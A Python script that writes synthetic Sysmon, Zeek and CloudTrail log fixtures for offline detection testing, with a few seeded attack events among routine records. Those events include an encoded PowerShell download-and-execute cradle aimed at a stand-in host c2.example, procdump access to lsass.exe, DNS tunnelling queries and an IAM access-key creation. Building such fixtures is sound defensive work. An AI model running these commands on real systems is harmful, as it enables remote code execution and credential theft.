#!/usr/bin/env python
"""Generate synthetic security telemetry samples for offline testing and M2 fixtures.

Produces deterministic Sysmon, Zeek, and CloudTrail JSONL logs under data/raw/telemetry/samples/.
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SAMPLE_DIR = ROOT / "data" / "raw" / "telemetry" / "samples"


def generate_sysmon(count: int = 100) -> list[dict]:
    rng = random.Random(20260911)
    base_time = datetime(2026, 9, 11, 8, 0, 0, tzinfo=timezone.utc)
    records = []

    hosts = ["CORP-WKSTN-001", "CORP-WKSTN-002", "CORP-SRV-010", "CORP-DC-001"]
    users = ["corp\\jdoe", "corp\\asmith", "corp\\admin_sys", "corp\\svc_backup"]

    # Special attack records required by contract
    # 1. Encoded PowerShell (T1059.001)
    records.append({
        "timestamp": (base_time + timedelta(minutes=5)).isoformat(),
        "source": "sysmon",
        "event_id": 1,
        "event_type": "ProcessCreate",
        "host_id": "HOST-0001",
        "hostname": "CORP-WKSTN-001",
        "user_name": "corp\\jdoe",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": (
            "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand "
            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB4AGEAbQBwAGwAZQAvAGEucABzADEAJwApAA=="
        ),
        "process_guid": "{11111111-2222-3333-4444-555555555555}",
        "parent_image": "C:\\Windows\\explorer.exe",
    })

    # 2. LSASS access (T1003.001)
    records.append({
        "timestamp": (base_time + timedelta(minutes=15)).isoformat(),
        "source": "sysmon",
        "event_id": 10,
        "event_type": "ProcessAccess",
        "host_id": "HOST-0001",
        "hostname": "CORP-WKSTN-001",
        "user_name": "corp\\jdoe",
        "source_image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\procdump.exe",
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "granted_access": "0x1010",
        "process_guid": "{22222222-3333-4444-5555-666666666666}",
    })

    # 3. DNS query (T1071.004)
    records.append({
        "timestamp": (base_time + timedelta(minutes=20)).isoformat(),
        "source": "sysmon",
        "event_id": 22,
        "event_type": "DnsQuery",
        "host_id": "HOST-0001",
        "hostname": "CORP-WKSTN-001",
        "user_name": "corp\\jdoe",
        "query_name": "v3x7b9z1q8m2.tunnel.c2.example.org",
        "query_results": "198.51.100.44",
        "process_guid": "{33333333-4444-5555-6666-777777777777}",
    })

    for i in range(len(records), count):
        t = base_time + timedelta(seconds=i * 45)
        eid = rng.choice([1, 3, 22])
        h = rng.choice(hosts)
        u = rng.choice(users)
        if eid == 1:
            records.append({
                "timestamp": t.isoformat(),
                "source": "sysmon",
                "event_id": 1,
                "event_type": "ProcessCreate",
                "host_id": f"HOST-{i:04d}",
                "hostname": h,
                "user_name": u,
                "image": "C:\\Program Files\\Browser\\browser.exe",
                "command_line": "browser.exe --type=utility",
                "process_guid": f"{{{i:08d}-0000-0000-0000-000000000000}}",
            })
        elif eid == 3:
            records.append({
                "timestamp": t.isoformat(),
                "source": "sysmon",
                "event_id": 3,
                "event_type": "NetworkConnect",
                "host_id": f"HOST-{i:04d}",
                "hostname": h,
                "user_name": u,
                "destination_ip": "10.0.0.15",
                "destination_port": 443,
                "process_guid": f"{{{i:08d}-0000-0000-0000-000000000000}}",
            })
        else:
            records.append({
                "timestamp": t.isoformat(),
                "source": "sysmon",
                "event_id": 22,
                "event_type": "DnsQuery",
                "host_id": f"HOST-{i:04d}",
                "hostname": h,
                "user_name": u,
                "query_name": "internal.service.corp.local",
                "query_results": "10.0.0.2",
            })

    return records


def generate_zeek(count: int = 100) -> list[dict]:
    rng = random.Random(20260911)
    base_time = datetime(2026, 9, 11, 8, 0, 0, tzinfo=timezone.utc)
    records = []

    for i in range(count):
        t = base_time + timedelta(seconds=i * 30)
        is_dns = (i % 2 == 0)
        if is_dns:
            records.append({
                "ts": t.timestamp(),
                "uid": f"C{i:06d}Z",
                "id.orig_h": f"10.0.1.{rng.randint(10, 200)}",
                "id.orig_p": rng.randint(40000, 65000),
                "id.resp_h": "10.0.0.53",
                "id.resp_p": 53,
                "proto": "udp",
                "service": "dns",
                "query": "corp.internal" if rng.random() > 0.1 else "beacon.c2.example",
                "qtype_name": "A",
                "rcode_name": "NOERROR",
            })
        else:
            records.append({
                "ts": t.timestamp(),
                "uid": f"C{i:06d}Z",
                "id.orig_h": f"10.0.1.{rng.randint(10, 200)}",
                "id.orig_p": rng.randint(40000, 65000),
                "id.resp_h": f"192.168.1.{rng.randint(10, 50)}",
                "id.resp_p": rng.choice([80, 443, 8080, 22]),
                "proto": "tcp",
                "service": "ssl",
                "duration": round(rng.uniform(0.1, 15.0), 3),
                "orig_bytes": rng.randint(200, 50000),
                "resp_bytes": rng.randint(500, 500000),
                "conn_state": "SF",
            })
    return records


def generate_cloudtrail(count: int = 80) -> list[dict]:
    rng = random.Random(20260911)
    base_time = datetime(2026, 9, 11, 8, 0, 0, tzinfo=timezone.utc)
    records = []

    # Attack record: CreateAccessKey (T1098)
    records.append({
        "eventTime": (base_time + timedelta(minutes=30)).isoformat(),
        "eventSource": "iam.amazonaws.com",
        "eventName": "CreateAccessKey",
        "awsRegion": "us-east-1",
        "sourceIPAddress": "203.0.113.88",
        "userAgent": "aws-cli/2.15.0 Python/3.11.6",
        "userIdentity": {
            "type": "IAMUser",
            "principalId": "AIDAEXAMPLEADMINKEY",
            "arn": "arn:aws:iam::123456789012:user/admin_user",
            "userName": "admin_user",
        },
        "responseElements": {
            "accessKey": {
                "accessKeyId": "AKIAIOSFODNN7EXAMPLE",
                "status": "Active",
                "userName": "admin_user",
            }
        },
    })

    routine_actions = [
        ("ec2.amazonaws.com", "DescribeInstances"),
        ("s3.amazonaws.com", "ListBuckets"),
        ("sts.amazonaws.com", "GetCallerIdentity"),
        ("ec2.amazonaws.com", "DescribeSecurityGroups"),
        ("logs.amazonaws.com", "DescribeLogStreams"),
    ]

    for i in range(len(records), count):
        t = base_time + timedelta(seconds=i * 60)
        source, action = rng.choice(routine_actions)
        records.append({
            "eventTime": t.isoformat(),
            "eventSource": source,
            "eventName": action,
            "awsRegion": "us-east-1",
            "sourceIPAddress": f"10.0.{rng.randint(1, 10)}.{rng.randint(2, 250)}",
            "userAgent": "boto3/1.34.0 Python/3.11",
            "userIdentity": {
                "type": "AssumedRole",
                "principalId": f"AROAEXAMPLE:{i}",
                "arn": f"arn:aws:sts::123456789012:assumed-role/ServiceRole/session-{i}",
                "userName": f"role-session-{i}",
            },
            "responseElements": {"status": "SUCCESS"},
        })
    return records


def main() -> None:
    SAMPLE_DIR.mkdir(parents=True, exist_ok=True)

    sysmon_data = generate_sysmon(100)
    (SAMPLE_DIR / "sysmon.jsonl").write_text(
        "\n".join(json.dumps(r) for r in sysmon_data) + "\n", encoding="utf-8"
    )

    zeek_data = generate_zeek(100)
    (SAMPLE_DIR / "zeek.jsonl").write_text(
        "\n".join(json.dumps(r) for r in zeek_data) + "\n", encoding="utf-8"
    )

    cloudtrail_data = generate_cloudtrail(80)
    (SAMPLE_DIR / "cloudtrail.jsonl").write_text(
        "\n".join(json.dumps(r) for r in cloudtrail_data) + "\n", encoding="utf-8"
    )

    print(f"Generated synthetic telemetry samples in {SAMPLE_DIR}:")
    print(f" - sysmon.jsonl: {len(sysmon_data)} records (includes encoded-PS, LSASS access, DNS query)")
    print(f" - zeek.jsonl: {len(zeek_data)} records (conn + dns)")
    print(f" - cloudtrail.jsonl: {len(cloudtrail_data)} records (includes CreateAccessKey)")


if __name__ == "__main__":
    main()
